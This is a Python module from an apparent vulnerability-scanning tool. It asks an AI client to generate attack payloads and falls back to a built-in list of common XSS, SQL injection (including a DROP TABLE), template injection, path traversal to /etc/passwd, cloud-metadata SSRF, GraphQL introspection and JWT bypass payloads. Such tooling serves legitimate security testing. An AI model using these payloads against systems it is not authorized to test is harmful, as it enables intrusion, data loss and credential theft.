from __future__ import annotations

import logging

from bugfinder.ai.client import get_ai_client
from bugfinder.core.config import Settings

logger = logging.getLogger(__name__)


class PayloadSelector:
    def __init__(self):
        self.settings = Settings()
        self.client = get_ai_client()

    async def select_payloads(self, vuln_type: str, tech_stack: list[str] | None = None) -> list[dict[str, str]]:
        tech = tech_stack or []
        if self.client and self.settings.ai_enabled:
            prompt = f"""Generate the most effective test payloads for {vuln_type} against a target with: {", ".join(tech) if tech else "unknown technology"}.
Return 5-10 payloads as JSON: {{"payloads": [{{"value": string, "description": string, "expected_result": string, "priority": int}}]}}
Focus on real-world tested payloads that are most likely to work.
"""
            try:
                response = await self.client.chat_json(prompt)
                if isinstance(response, dict) and "payloads" in response:
                    return response["payloads"]
            except Exception as e:
                logger.error("AI payload selection failed: %s", e)

        return self._default_payloads(vuln_type)

    def _default_payloads(self, vuln_type: str) -> list[dict[str, str]]:
        payload_map = {
            "xss": [
                {
                    "value": "<script>alert(1)</script>",
                    "description": "Basic script injection",
                    "expected_result": "Alert box",
                    "priority": "1",
                },
                {
                    "value": '"><script>alert(1)</script>',
                    "description": "Tag break + script",
                    "expected_result": "Alert box",
                    "priority": "2",
                },
                {
                    "value": "<img src=x onerror=alert(1)>",
                    "description": "Image tag XSS",
                    "expected_result": "Alert box",
                    "priority": "3",
                },
                {
                    "value": "javascript:alert(1)",
                    "description": "Protocol-based XSS",
                    "expected_result": "Alert box",
                    "priority": "4",
                },
            ],
            "sqli": [
                {"value": "'", "description": "Single quote", "expected_result": "Error", "priority": "1"},
                {
                    "value": "' OR '1'='1",
                    "description": "Basic OR bypass",
                    "expected_result": "All rows returned",
                    "priority": "2",
                },
                {
                    "value": "' UNION SELECT NULL--",
                    "description": "UNION injection",
                    "expected_result": "Column count revealed",
                    "priority": "3",
                },
                {
                    "value": "'; DROP TABLE users--",
                    "description": "Stacked query",
                    "expected_result": "Error or timeout",
                    "priority": "5",
                },
            ],
            "ssti": [
                {"value": "{{7*7}}", "description": "Jinja2 basic test", "expected_result": "49", "priority": "1"},
                {"value": "${7*7}", "description": "Freemarker basic test", "expected_result": "49", "priority": "2"},
                {"value": "#{7*7}", "description": "Velocity basic test", "expected_result": "49", "priority": "3"},
                {"value": "{{config}}", "description": "Jinja2 config dump", "expected_result": "Config object", "priority": "4"},
            ],
            "lfi": [
                {
                    "value": "../../../etc/passwd",
                    "description": "Basic path traversal",
                    "expected_result": "File contents",
                    "priority": "1",
                },
                {
                    "value": "....//....//....//etc/passwd",
                    "description": "WAF bypass",
                    "expected_result": "File contents",
                    "priority": "2",
                },
                {
                    "value": "php://filter/convert.base64-encode/resource=index.php",
                    "description": "PHP wrapper",
                    "expected_result": "Base64 source",
                    "priority": "3",
                },
            ],
            "ssrf": [
                {
                    "value": "http://169.254.169.254/latest/meta-data/",
                    "description": "AWS metadata",
                    "expected_result": "AWS instance data",
                    "priority": "1",
                },
                {
                    "value": "http://localhost:22",
                    "description": "Localhost SSH",
                    "expected_result": "Banner/error",
                    "priority": "2",
                },
                {
                    "value": "file:///etc/passwd",
                    "description": "File protocol",
                    "expected_result": "File contents",
                    "priority": "3",
                },
            ],
            "graphql": [
                {
                    "value": '{"query":"{__schema{types{name}}}"}',
                    "description": "Introspection query",
                    "expected_result": "Schema data",
                    "priority": "1",
                },
                {
                    "value": '{"query":"mutation{__typename}"}',
                    "description": "Test mutation",
                    "expected_result": "Response",
                    "priority": "2",
                },
            ],
            "jwt": [
                {"value": "none", "description": "None algorithm", "expected_result": "Token accepted", "priority": "1"},
                {"value": "secret", "description": "Weak secret guess", "expected_result": "Valid token", "priority": "2"},
            ],
        }
        return payload_map.get(
            vuln_type,
            [{"value": "test", "description": f"Basic {vuln_type} test", "expected_result": "Check response", "priority": "1"}],
        )
